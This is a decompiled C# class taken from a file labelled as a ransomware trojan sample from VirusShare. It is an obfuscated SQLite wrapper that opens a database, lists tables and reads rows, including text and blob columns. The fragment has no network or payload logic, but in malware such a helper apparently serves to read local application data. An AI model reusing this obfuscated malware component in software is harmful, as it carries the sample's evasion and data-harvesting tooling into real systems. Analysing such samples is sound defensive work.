// Decompiled with JetBrains decompiler
// Type: 89i9tLogfvmq5.Vj7mYOOm60
// Assembly: server, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6553F898-CBD0-47A7-92A7-55BBDA5305CE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Foreign.mych-6be0d3d79f05d0cc7a2c85feaaa1d34c5c5402f7c1867713dd94f7251ab645da.exe

using \u00389i9tLogfvmq5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace \u00389i9tLogfvmq5
{
  public class Vj7mYOOm60
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr cmpBUeNhC6HB183;

    public Vj7mYOOm60() => this.cmpBUeNhC6HB183 = IntPtr.Zero;

    public Vj7mYOOm60(string baseName) => this.lwvyGEf5CYJMH0s258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr xSWfQ6WD239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr SzVKkFRn240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int \u0035tjeUwseQaCkvB3241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int zUtcBubx0Xodohc242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int BgrJguuAs1pIpFu243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int B7hvlPRtfSTWigw244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr i4XDymTMkz4k1ab245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int MLSwmgWSVnKMbRn246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int xbjVJlKM67HlWWg247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int vQi4674MUflb2gO248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr zHVX1T15qQ1ZLpE249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int VZVERUu7KftpoGo250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int \u0039IvixZqZVnuLRd4251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double \u0037ingjlfnoU5AaHx252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr tCo2GjutREv00hn253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr \u0038CTG7a27m2Ul6nr254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr pfhnTRmPxKDPvCO255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr lf50LtGtAmru20M256(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int Yn5pefICnwMNmWt257(IntPtr handle);

    public void lwvyGEf5CYJMH0s258(string baseName)
    {
      if (Vj7mYOOm60.zUtcBubx0Xodohc242(this.nSqtQtf5aGP8265(baseName), out this.cmpBUeNhC6HB183) != 0)
      {
        this.cmpBUeNhC6HB183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void nkOLMgK5nyCC259()
    {
      if (!(this.cmpBUeNhC6HB183 != IntPtr.Zero))
        return;
      Vj7mYOOm60.BgrJguuAs1pIpFu243(this.cmpBUeNhC6HB183);
    }

    public ArrayList IuYGkw61UYtj260()
    {
      DataTable dataTable = this.YA9dAq7Z32xA262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void \u0037Ihtrvs1CV8s261(string query)
    {
      IntPtr errorr;
      Vj7mYOOm60.B7hvlPRtfSTWigw244(this.cmpBUeNhC6HB183, this.nSqtQtf5aGP8265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.\u0036dpDnKBtW5fj266(Vj7mYOOm60.i4XDymTMkz4k1ab245(errorr)));
    }

    public DataTable YA9dAq7Z32xA262(string query)
    {
      IntPtr statement;
      Vj7mYOOm60.MLSwmgWSVnKMbRn246(this.cmpBUeNhC6HB183, this.nSqtQtf5aGP8265(query), this.y3xneyThrwLS268(this.nSqtQtf5aGP8265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.DiofBYxoQuE4263(statement, ref table);
      while (num == 100)
        num = this.YhES5B0MlwHJ264(statement, ref table);
      Vj7mYOOm60.Yn5pefICnwMNmWt257(statement);
      return table;
    }

    private int DiofBYxoQuE4263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (Vj7mYOOm60.xbjVJlKM67HlWWg247(statement) == 100)
      {
        int num1 = Vj7mYOOm60.vQi4674MUflb2gO248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.\u0036dpDnKBtW5fj266(Vj7mYOOm60.zHVX1T15qQ1ZLpE249(statement, columnNumber));
          int num3 = Vj7mYOOm60.VZVERUu7KftpoGo250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) Vj7mYOOm60.\u0039IvixZqZVnuLRd4251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) Vj7mYOOm60.\u0037ingjlfnoU5AaHx252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.\u0036dpDnKBtW5fj266(Vj7mYOOm60.tCo2GjutREv00hn253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) Vj7mYOOm60.pfhnTRmPxKDPvCO255(statement, columnNumber);
            objArray[columnNumber] = (object) this.LfUr2Ke7AESI267(Vj7mYOOm60.\u0038CTG7a27m2Ul6nr254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return Vj7mYOOm60.xbjVJlKM67HlWWg247(statement);
    }

    private int YhES5B0MlwHJ264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = Vj7mYOOm60.vQi4674MUflb2gO248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = Vj7mYOOm60.VZVERUu7KftpoGo250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) Vj7mYOOm60.\u0039IvixZqZVnuLRd4251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) Vj7mYOOm60.\u0037ingjlfnoU5AaHx252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.\u0036dpDnKBtW5fj266(Vj7mYOOm60.tCo2GjutREv00hn253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) Vj7mYOOm60.pfhnTRmPxKDPvCO255(statement, columnNumber);
            objArray[columnNumber] = (object) this.LfUr2Ke7AESI267(Vj7mYOOm60.\u0038CTG7a27m2Ul6nr254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = Vj7mYOOm60.xbjVJlKM67HlWWg247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr nSqtQtf5aGP8265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = Vj7mYOOm60.xSWfQ6WD239(Vj7mYOOm60.SzVKkFRn240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string \u0036dpDnKBtW5fj266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.y3xneyThrwLS268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array LfUr2Ke7AESI267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.y3xneyThrwLS268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int y3xneyThrwLS268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : Vj7mYOOm60.\u0035tjeUwseQaCkvB3241(ptr);

    public enum zO2qrIyrkH5j61
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
